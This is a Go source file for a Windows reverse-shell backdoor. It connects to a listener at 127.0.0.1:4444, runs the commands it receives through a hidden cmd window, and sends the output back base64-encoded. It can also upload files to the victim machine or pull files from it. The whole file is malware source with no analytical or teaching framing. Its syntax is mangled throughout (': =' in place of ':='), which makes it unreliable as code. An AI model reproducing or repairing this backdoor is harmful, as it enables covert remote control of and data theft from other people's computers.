package main
import (
  "bufio"
  "encoding/base64"
  "fmt"
  "io"
  "io/ioutil"
  "net"
  "os"
  "os/exec"
  "strconv"
  "strings"
  "syscall"
)
const BUFFERS = 1024
func main() {
  conn, err: = net.Dial("tcp", "127.0.0.1:4444")
  if err != nil {
      fmt.Println(err)
    }
  for {
    operationNumber, _: = handleRequest(conn)
    stringOpNumber: = string(operationNumber)
    if stringOpNumber == "1\n" {
      for {
        message, err: = handleRequest(conn)
        if err != nil {
          fmt.Println(err)
        }
        if len(message) >= 1 {
          if message == "--\n" {
            directory, err: = readDirectory(conn)
            if err != nil {
              fmt.Print(err)
            }
            pureDirectory: = strings.TrimRight(directory, "\r\n")
            os.Chdir(pureDirectory)
          }
          if message == "exit\n" {
            break
          } else {
            out, err: = executeCommand(message)
            if err != nil {
              fmt.Fprintf(conn, string("Error running command.") + "\n")
            } else {
              for len(out) >= 1 {
                conn.Write(out)
                break
              }
            }
          }
        }
      }
    }
    if stringOpNumber == "2\n" {
      getFile(conn)
    }
    if stringOpNumber == "3\n" {
      fileName, err: = handleRequest(conn)
      if err != nil {
        fmt.Println(err)
      }
      purefileName: = strings.TrimSuffix(fileName, "\n")
      sendFile(purefileName, conn)
    }
  }
}
func handleRequest(connection io.Reader)(string, error) {
  message, err: = bufio.NewReader(connection).ReadString('\n')
  return message, err
}
func readDirectory(connection net.Conn)(string, error) {
  buffer: = make([] byte, 1024)
  length,
  err: = connection.Read(buffer)
  str: = string(buffer[: length])
  return str,
  err
}
func executeCommand(command string)([] byte, error) {
  cmd: = exec.Command("cmd", "/k", string(command))
  cmd.SysProcAttr = & syscall.SysProcAttr {
    HideWindow: true
  }
  out,
  err: = cmd.Output()
  encodedMessage: = base64encode(out)
  encodedMessage += "\n"
  bEncodedMessage: = stringToByte(encodedMessage)
  return bEncodedMessage,
  err
}
func getFile(connect net.Conn) {
  bufferFileName: = make([] byte, 64)
  bufferFileSize: = make([] byte, 10)
    connect.Read(bufferFileSize)
  fileSize,
  _: = strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
    connect.Read(bufferFileName)
  fileName: = strings.Trim(string(bufferFileName), ":")
    newFile,
  err: = os.Create(fileName)
  if err != nil {
    panic(err)
  }
  defer newFile.Close()
  var receivedBytes int64
  for {
    if (fileSize - receivedBytes) < BUFFERS {
      io.CopyN(newFile, connect, (fileSize - receivedBytes))
      connect.Read(make([] byte, (receivedBytes + BUFFERS) - fileSize))
      break
    }
    io.CopyN(newFile, connect, BUFFERS)
    receivedBytes += BUFFERS
  }
}
func sendFile(filename string, connection net.Conn) {
  f, err: = ioutil.ReadFile(filename)
  if err != nil {
    fmt.Println(err)
  }
  sFile: = base64encode(f)
  sFile += "\n"
  bFile: = stringToByte(sFile)
  connection.Write(bFile)
}
func byteToString(varName[] byte) string {
  stringVar: = string(varName)
  return stringVar
}
func stringToByte(varName string)[] byte {
  byteVar: = [] byte(varName)
  return byteVar
}
func base64encode(byteVar[] byte) string {
  str: = base64.StdEncoding.EncodeToString(byteVar)
  return str
}
func base64decode(varName string)([] byte, error) {
  data, err: = base64.StdEncoding.DecodeString(varName)
  return data, err
}
